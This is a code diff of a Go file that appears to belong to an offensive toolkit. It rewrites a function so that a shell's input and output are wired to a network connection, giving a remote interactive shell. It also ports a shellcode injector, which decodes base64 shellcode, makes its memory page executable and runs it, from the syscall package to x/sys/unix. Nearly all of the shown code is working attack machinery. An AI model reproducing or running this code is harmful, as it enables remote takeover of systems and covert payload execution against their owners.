@@ -6,24 +6,17 @@ import (
 	"encoding/base64"
 	"net"
 	"os/exec"
-	"syscall"
+	"golang.org/x/sys/unix"
 	"unsafe"
 )
 
-// GetShell returns an *exec.Cmd instance which will run /bin/sh
-func GetShell() *exec.Cmd {
+// GetShell returns an *exec.Cmd instance which will run /bin/bash
+func GetShell(conn net.Conn) {
 	cmd := exec.Command("/bin/sh")
-	return cmd
-}
-
-// ExecuteCmd runs the provided command through /bin/sh
-// and redirects the result to the provided net.Conn object.
-func ExecuteCmd(command string, conn net.Conn) {
-	cmdPath := "/bin/sh"
-	cmd := exec.Command(cmdPath, "-c", command)
 	cmd.Stdout = conn
+	cmd.Stdin = conn
 	cmd.Stderr = conn
-	cmd.Run()
+	_ = cmd.Run()
 }
 
 // InjectShellcode decodes base64 encoded shellcode
@@ -40,7 +33,7 @@ func InjectShellcode(encShellcode string) {
 // Get the page containing the given pointer
 // as a byte slice.
 func getPage(p uintptr) []byte {
-	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
+	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(unix.Getpagesize()-1))))[:unix.Getpagesize()]
 }
 
 // ExecShellcode sets the memory page containing the shellcode
@@ -48,7 +41,7 @@ func getPage(p uintptr) []byte {
 func ExecShellcode(shellcode []byte) {
 	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
 	page := getPage(shellcodeAddr)
-	_ = syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
+	_ = unix.Mprotect(page, unix.PROT_READ|unix.PROT_EXEC)
 	shellPtr := unsafe.Pointer(&shellcode)
 	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
 	go shellcodeFuncPtr()
